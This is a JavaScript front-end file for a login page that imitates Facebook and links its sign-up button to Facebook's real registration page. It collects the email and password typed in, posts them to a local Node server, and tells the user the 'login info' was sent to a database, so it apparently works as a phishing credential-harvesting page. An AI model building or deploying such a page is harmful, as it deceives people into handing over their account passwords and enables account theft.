document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('.login-form');
    const loginBtn = document.querySelector('.login-btn');
    const createBtn = document.querySelector('.create-account-btn');

    // Handle Login Form Submission
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const inputs = loginForm.querySelectorAll('input');
        let allFilled = true;

        inputs.forEach(input => {
            if (!input.value) {
                allFilled = false;
                input.style.border = '1px solid red';
            } else {
                input.style.border = '1px solid #dddfe2';
            }
        });

        if (allFilled) {
            const email = inputs[0].value;
            const password = inputs[1].value;

            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            })
                .then(res => res.json())
                .then(data => {
                    if (data.error) {
                        alert('Error: ' + data.error);
                    } else {
                        alert('Login info sent to database!');
                        inputs.forEach(i => i.value = '');
                    }
                })
                .catch(err => {
                    console.error(err);
                    alert('Error connecting to server. Make sure node server.js is running.');
                });
        } else {
            alert('Please fill in all fields.');
        }
    });

    // Handle Create Account Button Click
    createBtn.addEventListener('click', () => {
        window.open('https://www.facebook.com/r.php', '_blank');
    });

    // Reset borders on input
    const inputs = loginForm.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            input.style.border = '1px solid #dddfe2';
        });
    });

    // Handle Banner Close
    const closeBannerBtn = document.querySelector('.close-banner');
    const banner = document.querySelector('.error-banner');

    if (closeBannerBtn && banner) {
        // Auto-dismiss after 15 seconds
        const autoDismissTimer = setTimeout(() => {
            if (banner.style.display !== 'none') {
                banner.style.display = 'none';
            }
        }, 15000); // 15 seconds

        closeBannerBtn.addEventListener('click', () => {
            banner.style.display = 'none';
            clearTimeout(autoDismissTimer); // Clear timer if manually closed
        });
    }
});
